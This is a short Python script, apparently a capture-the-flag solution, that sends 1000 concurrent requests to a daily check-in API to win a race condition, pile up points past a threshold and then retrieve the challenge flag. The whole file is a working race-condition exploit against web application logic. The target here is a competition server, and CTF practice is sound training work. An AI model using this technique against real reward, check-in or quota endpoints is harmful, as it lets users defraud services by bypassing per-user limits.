import requests
import threading
import os

url = "http://cddc2026-challs-alb-2050157501.ap-southeast-1.elb.amazonaws.com:7219/"
s = requests.Session()

s.headers.update({
    "X-Session-ID": os.urandom(16).hex()
})

def checkin():
    try:
        res = s.post(f"{url}/api/daily-checkin", timeout=5)
        data = res.json()

        if data['success']:
            print(data)

            if res.json()['points'] >= 1000:
                res = s.get(f'{url}/api/flag')

                with open('out.txt', 'w') as f:
                    f.write(res.text)

    except Exception as e:
        print('Error:', e)

threads = []

for _ in range(1000):
    t = threading.Thread(target=checkin)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

res = s.get(f"{url}/api/flag")

assert res.json()['success']
print("Flag:", res.json()['flag'])